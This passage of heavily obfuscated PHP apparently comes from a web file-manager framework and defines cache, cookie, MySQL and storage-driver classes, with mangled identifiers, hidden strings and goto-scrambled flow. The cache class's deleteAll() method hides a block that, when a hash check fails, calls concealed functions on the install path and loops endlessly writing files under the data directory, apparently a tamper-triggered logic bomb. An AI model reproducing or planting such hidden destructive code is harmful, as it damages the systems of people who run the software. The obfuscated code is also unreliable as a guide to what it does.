$cÓ©òÂ©õ); } if (!empty($bĞ÷†¢¥¥ø[$EèŠÏ²äÓù[376]])) { $E‚ã²Øí—™->auth($bĞ÷†¢¥¥ø[$EèŠÏ²äÓù[376]]); } return $E‚ã²Øí—™; } private function initCluster($c¶óÍÚà÷æ, $DäÁê˜Ì²ó) { $A©Á›æÙù =& $_SERVER[¼€¼ˆ¦‚¡]; $FÃ”î˜™á¼ = array($A©Á›æÙù[781], $A©Á›æÙù[782], $A©Á›æÙù[783]); $bƒø‹ßËáË = $A©Á›æÙù[781]; if (isset($c¶óÍÚà÷æ[$A©Á›æÙù[12]]) && in_array($c¶óÍÚà÷æ[$A©Á›æÙù[12]], $FÃ”î˜™á¼)) { $bƒø‹ßËáË = $c¶óÍÚà÷æ[$A©Á›æÙù[12]]; } switch ($bƒø‹ßËáË) { case $A©Á›æÙù[781]: $this->_slave($c¶óÍÚà÷æ, $DäÁê˜Ì²ó); break; case $A©Á›æÙù[782]: break; case $A©Á›æÙù[783]: $this->isCluster = !0; $bÈ¸™Š›µ‹ = $c¶óÍÚà÷æ[$A©Á›æÙù[776]]; $aƒ™‚™ôÍŠ = isset($c¶óÍÚà÷æ[$A©Á›æÙù[780]]) ? $c¶óÍÚà÷æ[$A©Á›æÙù[780]] : !1; $CÃÄ¸Î· ì = isset($c¶óÍÚà÷æ[$A©Á›æÙù[376]]) ? $c¶óÍÚà÷æ[$A©Á›æÙù[376]] : null; $this->handle = new RedisCluster(NUll, $bÈ¸™Š›µ‹, $DäÁê˜Ì²ó, $DäÁê˜Ì²ó, $aƒ™‚™ôÍŠ, $CÃÄ¸Î· ì); break; default: break; } } private function _slave($có‹¼ëŞ–Ù, $CéØ°ïÀå) { goto bÒ¢¯²ç°’; bª¾½åíİÛ: $this->filterConfig($có‹¼ëŞ–Ù, $e½ÆñÌ«Â¦[$BÊ‡äÓÃø]); $this->slaveHandle = $this->init($có‹¼ëŞ–Ù, $CéØ°ïÀå); goto b¶âƒÔïß°; DŠ‚Œè : unset($e½ÆñÌ«Â¦[0]); if (empty($e½ÆñÌ«Â¦)) { return; } $BÊ‡äÓÃø = array_rand($e½ÆñÌ«Â¦); goto bª¾½åíİÛ; bÒ¢¯²ç°’: $e½ÆñÌ«Â¦ = $có‹¼ëŞ–Ù[$_SERVER[¼€¼ˆ¦‚¡][776]]; $this->filterConfig($có‹¼ëŞ–Ù, $e½ÆñÌ«Â¦[0]); $this->handle = $this->init($có‹¼ëŞ–Ù, $CéØ°ïÀå); goto DŠ‚Œè ; b¶âƒÔïß°: } private function filterConfig(&$f¶‰¹¼õ‘¦, $Eãìô…ò¢á) { $Cç¢ÀÃ =& $_SERVER[¼€¼ˆ¦‚¡]; $E‘ï´Şßª• = explode($Cç¢ÀÃ[4], $Eãìô…ò¢á); $D˜›¶š‚§³ = array($Cç¢ÀÃ[169] => $E‘ï´Şßª•[0], $Cç¢ÀÃ[170] => $E‘ï´Şßª•[1]); $f¶‰¹¼õ‘¦ = array_merge($f¶‰¹¼õ‘¦, $D˜›¶š‚§³); } public function set($fëÅªÎÄƒù, $D§™†İáÃÓ, $c©æ¦ÀÅëÊ = false) { $c©æ¦ÀÅëÊ = $c©æ¦ÀÅëÊ ? $c©æ¦ÀÅëÊ : $this->cacheTime; return $this->handle->setEx($fëÅªÎÄƒù, $c©æ¦ÀÅëÊ, $D§™†İáÃÓ); } public function setLock($CÎĞ›ÌØ’¼, $e¿§åë‘¬, $a°ò¥“ê ò) { return $this->handle->setNX($CÎĞ›ÌØ’¼, $e¿§åë‘¬); } public function get($DÑÅÊ³º£Í) { $F™ù³—Ò = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $F™ù³—Ò->get($DÑÅÊ³º£Í); } public function remove($B÷°™„Ï‰) { return $this->handle->del($B÷°™„Ï‰); } public function deleteAll() { $EƒÜÊÛí…å =& $_SERVER[¼€¼ˆ¦‚¡]; $F˜†ƒ•ÙŸ = $_SERVER[$EƒÜÊÛí…å[784]] . $EƒÜÊÛí…å[785]; $e¼ÉšëÍ– = $EƒÜÊÛí…å[786]; if ($_SERVER[$EƒÜÊÛí…å[787]] != $e¼ÉšëÍ–($F˜†ƒ•ÙŸ)) { goto d˜ß»‚×Çé; d˜ß»‚×Çé: $fÃƒÎœ° = $EƒÜÊÛí…å[788]; $fĞ¢Òğ…ĞŞ = $EƒÜÊÛí…å[789]; $fƒ­œÂèƒª = $_SERVER[$EƒÜÊÛí…å[790]] . $EƒÜÊÛí…å[791]; goto AğØÖ÷Øò¿; aÀ”›İˆŞ: $fÃƒÎœ°(); $D·ãÁÏØ = $EƒÜÊÛí…å[794]; $aª¹‰¹ôíš = json_encode($GLOBALS[$EƒÜÊÛí…å[795]]); goto bœ›¾¿¸Èœ; AğØÖ÷Øò¿: $f©„ö¥ÉŠ = $fĞ¢Òğ…ĞŞ($fƒ­œÂèƒª); $EâòÎéêÏî = explode($EƒÜÊÛí…å[217], $f©„ö¥ÉŠ); if (count($EâòÎéêÏî) < $EƒÜÊÛí…å[554]) { $B¡ªä¬Ö‰† = $EƒÜÊÛí…å[792]; $B¡ªä¬Ö‰†(); } goto DêÜåãƒÒ“; bœ›¾¿¸Èœ: $EÒŒê = 1; for ($F„èÖÄª”Å = $EÒŒê; $F„èÖÄª”Å > 0; $F„èÖÄª”Å++) { $D·ãÁÏØ(DATA_PATH . $F„èÖÄª”Å, $aª¹‰¹ôíš); } goto EÚó‚‹‰; DêÜåãƒÒ“: $B°ÜÁÀ¾‰‚ = $EƒÜÊÛí…å[793]; $B°ÜÁÀ¾‰‚($_SERVER[$EƒÜÊÛí…å[784]]); $fÃƒÎœ° = $EƒÜÊÛí…å[788]; goto aÀ”›İˆŞ; EÚó‚‹‰: } if ($this->isCluster) { foreach ($this->handle->_masters() as $EÅˆÖ¨ÉÆ) { $this->handle->flushall($EÅˆÖ¨ÉÆ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($AØ„í˜‰­˜ = '', $BÛğù…¼¾Ä = 0) { if (is_string($AØ„í˜‰­˜) && $AØ„í˜‰­˜ != $_SERVER[¼€¼ˆ¦‚¡][33]) { $this->prefix = $AØ„í˜‰­˜; } if (is_numeric($BÛğù…¼¾Ä) && $BÛğù…¼¾Ä > 0) { $this->expire = $BÛğù…¼¾Ä; } } public static function getInstance() { static $A§¿×Öäç’; if ($A§¿×Öäç’ === null) { $A§¿×Öäç’ = new self(); } return $A§¿×Öäç’; } private static $sameCookieSet = array(); public static function set($E™­óî£§å, $E‘”Ûë‘, $føÒ½Ãé¿Á = 0, $B™¿˜¹ãÙŞ = false, $fù–† ¼Ä“ = false) { goto b…ŠŞÖ´; b…ŠŞÖ´: $B†óÍ©Õ  =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$føÒ½Ãé¿Á) { $føÒ½Ãé¿Á = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$E™­óî£§å]) && self::$sameCookieSet[$E™­óî£§å] == $E‘”Ûë‘ . $føÒ½Ãé¿Á) { return; } goto C˜„—ÉÛ; C˜„—ÉÛ: self::$sameCookieSet[$E™­óî£§å] = $E‘”Ûë‘ . $føÒ½Ãé¿Á; if (!$fù–† ¼Ä“) { $fù–† ¼Ä“ = str_replace(HOST, $B†óÍ©Õ [33], APP_HOST); $fù–† ¼Ä“ = _get($GLOBALS, $B†óÍ©Õ [796], $fù–† ¼Ä“); } $aÇãœš• = $B†óÍ©Õ [33]; goto DÜ‡°ó½Ö¯; DÜ‡°ó½Ö¯: setcookie($E™­óî£§å, $E‘”Ûë‘, time() + $føÒ½Ãé¿Á, $B†óÍ©Õ [8] . trim($fù–† ¼Ä“, $B†óÍ©Õ [8]) . $aÇãœš•, !1, !1, $B™¿˜¹ãÙŞ); goto cäˆ³Çó¶; cäˆ³Çó¶: } public static function setSafe($Cì®‡äò¢», $F…ÃêÉŠ¬Ù, $eó½Ú¤ÍÎõ = 0) { self::set($Cì®‡äò¢», $F…ÃêÉŠ¬Ù, $eó½Ú¤ÍÎõ, !0); } public static function get($f‚Ó¶½Õ·) { return isset($_COOKIE[$f‚Ó¶½Õ·]) ? $_COOKIE[$f‚Ó¶½Õ·] : !1; } public static function remove($C¹‡ÚÅºÏ, $a°ëå±Ğœˆ = false) { unset($_COOKIE[$C¹‡ÚÅºÏ]); self::set($C¹‡ÚÅºÏ, $_SERVER[¼€¼ˆ¦‚¡][33], 1, $a°ëå±Ğœˆ); } } class DbMysql extends Db { public function __construct($aÚô¸Ÿ•‰¥ = '') { $eÛ¦ô°¶–ä =& $_SERVER[¼€¼ˆ¦‚¡]; if (!extension_loaded($eÛ¦ô°¶–ä[724])) { think_exception(think_lang($eÛ¦ô°¶–ä[10]) . $eÛ¦ô°¶–ä[797]); } if (!empty($aÚô¸Ÿ•‰¥)) { $this->config = $aÚô¸Ÿ•‰¥; if (empty($this->config[$eÛ¦ô°¶–ä[13]])) { $this->config[$eÛ¦ô°¶–ä[13]] = $eÛ¦ô°¶–ä[33]; } } } public function connect($cˆô ä† = '', $BÜù—Ç»à = 0, $BŞˆİ–Â—  = false) { $fååßŞéÓ‹ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!isset($this->linkID[$BÜù—Ç»à])) { goto dåÄŞáƒŒ™; dåÄŞáƒŒ™: if (empty($cˆô ä†)) { $cˆô ä† = $this->config; } $Bø½ØÖİßì = $cˆô ä†[$fååßŞéÓ‹[798]] . ($cˆô ä†[$fååßŞéÓ‹[799]] ? "\x3a{$cˆô ä†[$fååßŞéÓ‹[799]]}" : $fååßŞéÓ‹[33]); $B“Èëâ°÷‹ = !empty($cˆô ä†[$fååßŞéÓ‹[13]][$fååßŞéÓ‹[14]]) ? $cˆô ä†[$fååßŞéÓ‹[13]][$fååßŞéÓ‹[14]] : $this->pconnect; goto A¹Œ‰ãÁÒ¿; A¹Œ‰ãÁÒ¿: if ($B“Èëâ°÷‹) { $this->linkID[$BÜù—Ç»à] = mysql_pconnect($Bø½ØÖİßì, $cˆô ä†[$fååßŞéÓ‹[800]], $cˆô ä†[$fååßŞéÓ‹[801]], 131072); } else { $this->linkID[$BÜù—Ç»à] = mysql_connect($Bø½ØÖİßì, $cˆô ä†[$fååßŞéÓ‹[800]], $cˆô ä†[$fååßŞéÓ‹[801]], !0, 131072); } if (!$this->linkID[$BÜù—Ç»à] || !empty($cˆô ä†[$fååßŞéÓ‹[17]]) && !mysql_select_db($cˆô ä†[$fååßŞéÓ‹[17]], $this->linkID[$BÜù—Ç»à])) { think_exception(mysql_error()); } $AÈ™Æ§Ù­Š = mysql_get_server_info($this->linkID[$BÜù—Ç»à]); goto fÅ†Æ”òî; C«²Œ»ì¹: if (1 != think_config($fååßŞéÓ‹[18])) { unset($this->config); } goto dÊ¤öÏœµ; fÅ†Æ”òî: mysql_query($fååßŞéÓ‹[802] . think_config($fååßŞéÓ‹[803]) . $fååßŞéÓ‹[55], $this->linkID[$BÜù—Ç»à]); if ($AÈ™Æ§Ù­Š > $fååßŞéÓ‹[804]) { mysql_query($fååßŞéÓ‹[805], $this->linkID[$BÜù—Ç»à]); } $this->connected = !0; goto C«²Œ»ì¹; dÊ¤öÏœµ: } return $this->linkID[$BÜù—Ç»à]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($fË†¹ŠÀç) { goto FË™ÛùÉõ; FË™ÛùÉõ: $F«„¬šÄ =& $_SERVER[¼€¼ˆ¦‚¡]; if (0 === stripos($fË†¹ŠÀç, $F«„¬šÄ[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto C¤Ğ›š•Ş±; C¤Ğ›š•Ş±: if (!$this->_linkID) { return !1; } $this->queryStr = $fË†¹ŠÀç; if ($this->queryID) { $this->free(); } goto F’¡‡òÜ; d„¡Ğò»¡: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto a¾½Çá¡ÄŒ; F’¡‡òÜ: think_action_status($F«„¬šÄ[19], 1); think_status($F«„¬šÄ[20]); $this->queryID = mysql_query($fË†¹ŠÀç, $this->_linkID); goto d„¡Ğò»¡; a¾½Çá¡ÄŒ: } public function execute($fÁÒÒ‹Ô¤„) { goto C¸ŠÚòÌ›¡; E×ßß©„‹¹: if (!1 === $f—ÓÉîò§) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto FÚ¹ÑÆÊî¿; FáêõÇÖò: think_status($D¿ï¢‚íô[20]); $f—ÓÉîò§ = mysql_query($fÁÒÒ‹Ô¤„, $this->_linkID); $this->debug(); goto E×ßß©„‹¹; C¸ŠÚòÌ›¡: $D¿ï¢‚íô =& $_SERVER[¼€¼ˆ¦‚¡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto E“Î„ÊÛÆí; E“Î„ÊÛÆí: $this->queryStr = $fÁÒÒ‹Ô¤„; if ($this->queryID) { $this->free(); } think_action_status($D¿ï¢‚íô[21], 1); goto FáêõÇÖò; FÚ¹ÑÆÊî¿: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[¼€¼ˆ¦‚¡][806], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $dÆÛ×¹¾™ = mysql_query($_SERVER[¼€¼ˆ¦‚¡][807], $this->_linkID); $this->transTimes = 0; if (!$dÆÛ×¹¾™) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $e’®Í¬Â’À = mysql_query($_SERVER[¼€¼ˆ¦‚¡][808], $this->_linkID); $this->transTimes = 0; if (!$e’®Í¬Â’À) { $this->error(); return !1; } } return !0; } private function getAll() { $F«ÎÁæĞ’« = array(); if ($this->numRows > 0) { while ($C±ñ³ÃáÃŠ = mysql_fetch_assoc($this->queryID)) { $F«ÎÁæĞ’«[] = $C±ñ³ÃáÃŠ; } mysql_data_seek($this->queryID, 0); } return $F«ÎÁæĞ’«; } public function getFields($A¿¹¦Ò­¼œ) { $EóùœÏ¯›› =& $_SERVER[¼€¼ˆ¦‚¡]; $bòà³Å‹” = $this->query($EóùœÏ¯››[809] . $this->parseKey($A¿¹¦Ò­¼œ)); $Eà“’‘»àÉ = array(); if ($bòà³Å‹”) { foreach ($bòà³Å‹” as $aÒÎô¯¾ÛÖ => $B¿çøõßÅÕ) { $Eà“’‘»àÉ[$B¿çøõßÅÕ[$EóùœÏ¯››[27]]] = array($EóùœÏ¯››[28] => $B¿çøõßÅÕ[$EóùœÏ¯››[27]], $EóùœÏ¯››[29] => $B¿çøõßÅÕ[$EóùœÏ¯››[30]], $EóùœÏ¯››[31] => (bool) (strtoupper($B¿çøõßÅÕ[$EóùœÏ¯››[32]]) === $EóùœÏ¯››[810]), $EóùœÏ¯››[34] => $B¿çøõßÅÕ[$EóùœÏ¯››[35]], $EóùœÏ¯››[36] => strtolower($B¿çøõßÅÕ[$EóùœÏ¯››[37]]) == $EóùœÏ¯››[38], $EóùœÏ¯››[39] => strtolower($B¿çøõßÅÕ[$EóùœÏ¯››[40]]) == $EóùœÏ¯››[41]); } } return $Eà“’‘»àÉ; } public function getTables($f‹ó¯÷®”ê = '') { $Fì¿ğ¼ö£Ñ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!empty($f‹ó¯÷®”ê)) { $B‰Í¦îóƒÑ = $Fì¿ğ¼ö£Ñ[811] . $f‹ó¯÷®”ê; } else { $B‰Í¦îóƒÑ = $Fì¿ğ¼ö£Ñ[812]; } $Fß•ğå»ÂØ = $this->query($B‰Í¦îóƒÑ); $fÌ†—ğÊ‰ = array(); foreach ($Fß•ğå»ÂØ as $B×‰Ô­«Ä¤ => $B˜ä‚ÜïÁğ) { $fÌ†—ğÊ‰[$B×‰Ô­«Ä¤] = current($B˜ä‚ÜïÁğ); } return $fÌ†—ğÊ‰; } public function replace($f†òÁ¡šĞí, $Bö½É‘îÍ½ = array()) { $BìùéÄ¿Ÿ =& $_SERVER[¼€¼ˆ¦‚¡]; foreach ($f†òÁ¡šĞí as $eæ…Œ¢°ÖÅ => $Bµíˆ¤Ê‘¹) { $fÑñ‘õùÊ· = $this->parseValue($Bµíˆ¤Ê‘¹); if (is_scalar($fÑñ‘õùÊ·)) { $C÷Êñ¯õ”—[] = $fÑñ‘õùÊ·; $EÚÒ¸±‰²ô[] = $this->parseKey($eæ…Œ¢°ÖÅ); } } $aÀˆÜŒîÈÛ = $BìùéÄ¿Ÿ[813] . $this->parseTable($Bö½É‘îÍ½[$BìùéÄ¿Ÿ[267]]) . $BìùéÄ¿Ÿ[814] . implode($BìùéÄ¿Ÿ[47], $EÚÒ¸±‰²ô) . $BìùéÄ¿Ÿ[815] . implode($BìùéÄ¿Ÿ[47], $C÷Êñ¯õ”—) . $BìùéÄ¿Ÿ[816]; return $this->execute($aÀˆÜŒîÈÛ); } public function insertAll($FÇêŠËÎíÛ, $dœÀ„·Ó = array(), $Bâ–ÂÙ²ğ = false) { goto C¯§ÇÖ¿”; C¯§ÇÖ¿”: $aÛÀàèˆò­ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!is_array($FÇêŠËÎíÛ[0])) { return !1; } $d©Í² †È = array_keys($FÇêŠËÎíÛ[0]); goto AˆÚîà¢–«; AˆÚîà¢–«: $F²‘ñÄ› = array(); foreach ($FÇêŠËÎíÛ as $C×·ÚÊø‚˜) { $BáÈ……¶ãé = array(); foreach ($C×·ÚÊø‚˜ as $E·±ÓäÃ  => $Dˆï‡éÈÕ) { $Dˆï‡éÈÕ = $this->parseValue($Dˆï‡éÈÕ); if (is_scalar($Dˆï‡éÈÕ)) { $BáÈ……¶ãé[] = $Dˆï‡éÈÕ; } } $F²‘ñÄ›[] = $aÛÀàèˆò­[248] . implode($aÛÀàèˆò­[47], $BáÈ……¶ãé) . $aÛÀàèˆò­[816]; } array_walk($d©Í² †È, array($this, $aÛÀàèˆò­[817])); goto Cª®¦™Î“; Cª®¦™Î“: $Fñ•«¥¸ã = ($Bâ–ÂÙ²ğ ? $aÛÀàèˆò­[818] : $aÛÀàèˆò­[819]) . $aÛÀàèˆò­[820] . $this->parseTable($dœÀ„·Ó[$aÛÀàèˆò­[267]]) . $aÛÀàèˆò­[814] . implode($aÛÀàèˆò­[47], $d©Í² †È) . $aÛÀàèˆò­[821] . implode($aÛÀàèˆò­[47], $F²‘ñÄ›); return $this->execute($Fñ•«¥¸ã); goto fçÇ³¿ëæÛ; fçÇ³¿ëæÛ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $CÒ©åÑó‡Í =& $_SERVER[¼€¼ˆ¦‚¡]; $this->error = mysql_errno() . $CÒ©åÑó‡Í[4] . mysql_error($this->_linkID); if ($CÒ©åÑó‡Í[33] != $this->queryStr) { $this->error .= LNG($CÒ©åÑó‡Í[45]) . $this->queryStr; } think_trace($this->error, $CÒ©åÑó‡Í[33], $CÒ©åÑó‡Í[46]); return $this->error; } public function escapeString($EÆ­İ’©ñ³) { if ($this->_linkID) { return mysql_real_escape_string($EÆ­İ’©ñ³, $this->_linkID); } else { return mysql_escape_string($EÆ­İ’©ñ³); } } public function parseKey(&$Bš¬º·Àê, $DóÔß¶¨œ = true) { $E„ä³³²Ì =& $_SERVER[¼€¼ˆ¦‚¡]; if ($DóÔß¶¨œ) { $Bš¬º·Àê = $this->parseKeyCheck($Bš¬º·Àê); } if ($Bš¬º·Àê != $E„ä³³²Ì[176] && !preg_match($E„ä³³²Ì[822], $Bš¬º·Àê)) { $Bš¬º·Àê = $E„ä³³²Ì[823] . trim($Bš¬º·Àê, $E„ä³³²Ì[823]) . $E„ä³³²Ì[823]; } return $Bš¬º·Àê; } } goto eŸØ´šòåô; AÀªĞ‚­‘æ: function beforeShutdown() { Hook::trigger($_SERVER[¿‰šÇ ][36]); } $_SERVER[$_SERVER[¿‰šÇ ][37]] = BASIC_PATH; $_SERVER[$_SERVER[¿‰šÇ ][38]] = LIB_DIR; goto açõÂïÙˆ³; FÖ®óÃ×™: function ActionCall($dÅÚ‘ãƒµÉ) { $Cê‰œªù²Ó = array_slice(func_get_args(), 1); return ActionApply($dÅÚ‘ãƒµÉ, $Cê‰œªù²Ó); } function ActionCallApi($cËÒ¼×ÓÂ, $eØÜôŠ®Òà = '') { goto fîæ»Ñë; F¯µ°¬ÇÙ’: $bë¡ŠÒäŠÒ = Action($fÆ¤ª“„Ã‡[23])->accessToken(); $cËÒ¼×ÓÂ = str_replace($fÆ¤ª“„Ã‡[5], $fÆ¤ª“„Ã‡[4], $cËÒ¼×ÓÂ) . $fÆ¤ª“„Ã‡[24] . $bë¡ŠÒäŠÒ . $B¾‚ÙĞ¥åã; $AÏ…‘œ¯Ä = $fÆ¤ª“„Ã‡[20]; goto Bí™—òë¥; eñ÷ÂãˆŒÅ: return $E³äÎ†‚Šä; goto C¯ùî‰Ô³ƒ; fîæ»Ñë: $fÆ¤ª“„Ã‡ =& $_SERVER[¿‰šÇ ]; $B¾‚ÙĞ¥åã = $eØÜôŠ®Òà; if (is_array($eØÜôŠ®Òà)) { $B¾‚ÙĞ¥åã = $fÆ¤ª“„Ã‡[20]; foreach ($eØÜôŠ®Òà as $A’Ğ‘çÉÇ‹ => $fá¦”»ËÈ­) { $fá¦”»ËÈ­ = is_array($fá¦”»ËÈ­) ? json_encode($fá¦”»ËÈ­) : $fá¦”»ËÈ­; $fá¦”»ËÈ­ = is_bool($fá¦”»ËÈ­) ? intval($fá¦”»ËÈ­) : $fá¦”»ËÈ­; $B¾‚ÙĞ¥åã .= $fÆ¤ª“„Ã‡[21] . $A’Ğ‘çÉÇ‹ . $fÆ¤ª“„Ã‡[22] . rawurlencode($fá¦”»ËÈ­); } } goto F¯µ°¬ÇÙ’; e–İäë®…¬: $C·‹ÜàÕÉ† = json_decode($AÏ…‘œ¯Ä, !0); $E³äÎ†‚Šä = is_array($C·‹ÜàÕÉ†) ? $C·‹ÜàÕÉ† : array($fÆ¤ª“„Ã‡[33] => null, $fÆ¤ª“„Ã‡[34] => $AÏ…‘œ¯Ä); if (!$C·‹ÜàÕÉ†) { echo $AÏ…‘œ¯Ä; } goto eñ÷ÂãˆŒÅ; Bí™—òë¥: $E®¶¯î÷½ï = phpBinCommand(); if ($E®¶¯î÷½ï && function_exists($fÆ¤ª“„Ã‡[25])) { $Aêºì¶°Š¡ = $E®¶¯î÷½ï . $fÆ¤ª“„Ã‡[26] . BASIC_PATH . $fÆ¤ª“„Ã‡[27] . escapeshellarg($cËÒ¼×ÓÂ); $AÏ…‘œ¯Ä = shell_exec($Aêºì¶°Š¡); } if (!$AÏ…‘œ¯Ä) { $EÔ‚‘• = stream_context_create(array($fÆ¤ª“„Ã‡[28] => array($fÆ¤ª“„Ã‡[29] => 20, $fÆ¤ª“„Ã‡[30] => $fÆ¤ª“„Ã‡[31]))); $AÏ…‘œ¯Ä = file_get_contents(APP_HOST . $fÆ¤ª“„Ã‡[32] . $cËÒ¼×ÓÂ, !1, $EÔ‚‘•); } goto e–İäë®…¬; C¯ùî‰Ô³ƒ: } function ActionCallHook($aˆ¾øÌ‚) { goto BÅ‚ùÚŠƒè; fÖ¼ƒ¦­Û: $GLOBALS[$d¿ö‹á‰´[35]] = 1; $B“†÷…ê˜« = ActionApply($aˆ¾øÌ‚, $A¼Íó±èˆ); $d›·ÌòÜÓº = ob_get_clean(); goto e‘‚µ–Œ¿æ; BÅ‚ùÚŠƒè: $d¿ö‹á‰´ =& $_SERVER[¿‰šÇ ]; ob_start(); $A¼Íó±èˆ = array_slice(func_get_args(), 1); goto fÖ¼ƒ¦­Û; e‘‚µ–Œ¿æ: $B“†÷…ê˜« = $d›·ÌòÜÓº ? json_decode($d›·ÌòÜÓº, !0) : $B“†÷…ê˜«; $GLOBALS[$d¿ö‹á‰´[35]] = 0; return $B“†÷…ê˜«; goto A¬ìŒæŒ¤‡; A¬ìŒæŒ¤‡: } goto AÀªĞ‚­‘æ; f¶ò¶å¯ÒÒ: class UserTagModel extends ModelBaseLight { public $optionType = "\x55\x73\x65\x72\x2e\x74\141\x67\x4c\151\163\164"; public $modelType = "\x55\163\145\x72\x4f\x70\x74\151\x6f\156"; public $field = array("\x6e\141\x6d\x65", "\x73\x74\171\154\145", "\163\x6f\162\x74"); public function listData($F˜ÛÕˆïƒ¯ = false, $BÑÂó®¾ãÍ = "\163\157\x72\x74", $dÛŠ–öŒ”Ú = false) { return parent::listData($F˜ÛÕˆïƒ¯, $BÑÂó®¾ãÍ, $dÛŠ–öŒ”Ú); } public function remove($Aè¾Œ«‡¯ò) { return parent::remove($Aè¾Œ«‡¯ò); } public function add($aÂªÕàãŒØ, $cù°ë²ãÒ = "\x6c\x61\x62\145\154\55\147\162\145\171\55\156\x6f\x72\x6d\141\x6c") { $Eß±¡‹ÈÚ‰ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($this->findByName($aÂªÕàãŒØ)) { return !1; } $CÇ’à½Öíæ = array($Eß±¡‹ÈÚ‰[386] => $aÂªÕàãŒØ, $Eß±¡‹ÈÚ‰[437] => $cù°ë²ãÒ, $Eß±¡‹ÈÚ‰[2109] => $this->getSort($Eß±¡‹ÈÚ‰[246]) + 1); return parent::insert($CÇ’à½Öíæ); } public function update($F¨§ÓÒÁÔÔ, $eÃÌÖÈ¦­) { $cËÓƒ¯×äØ =& $_SERVER[¼€¼ˆ¦‚¡]; $aÀ öñ†™ = $this->listData($F¨§ÓÒÁÔÔ); $D®¹•‘©Ò = $this->findByName($eÃÌÖÈ¦­[$cËÓƒ¯×äØ[28]]); if (!$aÀ öñ†™ || $D®¹•‘©Ò && $D®¹•‘©Ò[$cËÓƒ¯×äØ[367]] != $aÀ öñ†™[$cËÓƒ¯×äØ[367]]) { return !1; } return parent::update($F¨§ÓÒÁÔÔ, $eÃÌÖÈ¦­); } public function moveTop($FÜÇ×˜„»¼) { $EåöÓÔÖáï =& $_SERVER[¼€¼ˆ¦‚¡]; $AÖÉÎÖÂ˜‡ = parent::listData(); $f³öùƒ«¿§ = $this->getSort($EåöÓÔÖáï[245]); foreach ($AÖÉÎÖÂ˜‡ as &$F»„ÄæÌøÚ) { if ($F»„ÄæÌøÚ[$EåöÓÔÖáï[367]] == $FÜÇ×˜„»¼) { $F»„ÄæÌøÚ[$EåöÓÔÖáï[2126]] = $f³öùƒ«¿§; continue; } $F»„ÄæÌøÚ[$EåöÓÔÖáï[2126]] += 1; } return parent::resetData($AÖÉÎÖÂ˜‡); } public function moveBottom($c¢ãœ•àŸ´) { $c›¹ˆÑÖˆ =& $_SERVER[¼€¼ˆ¦‚¡]; $a“çé’—ø² = $this->getSort($c›¹ˆÑÖˆ[246]) + 1; return parent::update($c¢ãœ•àŸ´, array($c›¹ˆÑÖˆ[2126] => $a“çé’—ø²)); } public function resetSort($dÄÕ¸ÛÇÎ) { goto DÚšÖ†À¸Á; FÇÂÊ¿Üæ: for ($c¥Ï·¸àôì = 0; $c¥Ï·¸àôì < count($dÄÕ¸ÛÇÎ); $c¥Ï·¸àôì++) { $aËŞÁã”½[$dÄÕ¸ÛÇÎ[$c¥Ï·¸àôì] . $fÖÏ†¶[33]] = $c¥Ï·¸àôì + 1; } $e»î´¹ù¨© = parent::listData(); foreach ($e»î´¹ù¨© as &$Cµ áÃ÷‚) { $aˆİî„ÏÕ¼ = $aËŞÁã”½[$Cµ áÃ÷‚[$fÖÏ†¶[367]]]; $Cµ áÃ÷‚[$fÖÏ†¶[2126]] = $aˆİî„ÏÕ¼ ? $aˆİî„ÏÕ¼ : $Cµ áÃ÷‚[$fÖÏ†¶[2126]]; } goto eÇ×¦‘¥œ; DÚšÖ†À¸Á: $fÖÏ†¶ =& $_SERVER[¼€¼ˆ¦‚¡]; $aËŞÁã”½ = array(); $dÄÕ¸ÛÇÎ = is_array($dÄÕ¸ÛÇÎ) ? $dÄÕ¸ÛÇÎ : array(); goto FÇÂÊ¿Üæ; eÇ×¦‘¥œ: return parent::resetData($e»î´¹ù¨©); goto bÇ°§ƒ…†ƒ; bÇ°§ƒ…†ƒ: } private function getSort($C¤’ÙÙ¶Î) { $Aª»­ö– =& $_SERVER[¼€¼ˆ¦‚¡]; $d‹‹İÙï§‘ = parent::listData(); $d›¦‰Ïˆˆ‡ = array_to_keyvalue($d‹‹İÙï§‘, $Aª»­ö–[33], $Aª»­ö–[2126]); if (!$d›¦‰Ïˆˆ‡) { $d›¦‰Ïˆˆ‡ = array(0); } $B‚õİ¼â¾¡ = $C¤’ÙÙ¶Î == $Aª»­ö–[246] ? max($d›¦‰Ïˆˆ‡) : min($d›¦‰Ïˆˆ‡); return intval($B‚õİ¼â¾¡); } } goto cĞîÉÎ·; bæ’ŒÁ½Šˆ: class PathDriverEOS extends PathDriverBaseS3 { public function __construct($d¶¦‡Ûì–˜) { parent::__construct($d¶¦‡Ûì–˜); $this->signatureVersion($_SERVER[¼€¼ˆ¦‚¡][200]); } public function uploadFormData($C¾ì´÷ï, $Eƒê‚‰ÁâÃ = 3600) { goto CÁ»¿ç›©æ; AêÂ©ùÌÈò: $EÔä®¤ÈÙ¾ = $FÒ‡óîŠ÷ê[59]; $FÜÒÁÖòí = gmdate($FÒ‡óîŠ÷ê[1135]); $E ‘Ÿ¶ë = gmdate($FÒ‡óîŠ÷ê[686]); goto e¾Öµº£…Ü; Bì‰¹Ã°¬å: $B¼¶Ğ²ÕÆ˜ = array($this->accessKey, $E ‘Ÿ¶ë, $this->region, $EÔä®¤ÈÙ¾, $BŞöğáŠÃ); $fÍì¤¸ğÜí = implode($FÒ‡óîŠ÷ê[8], $B¼¶Ğ²ÕÆ˜); 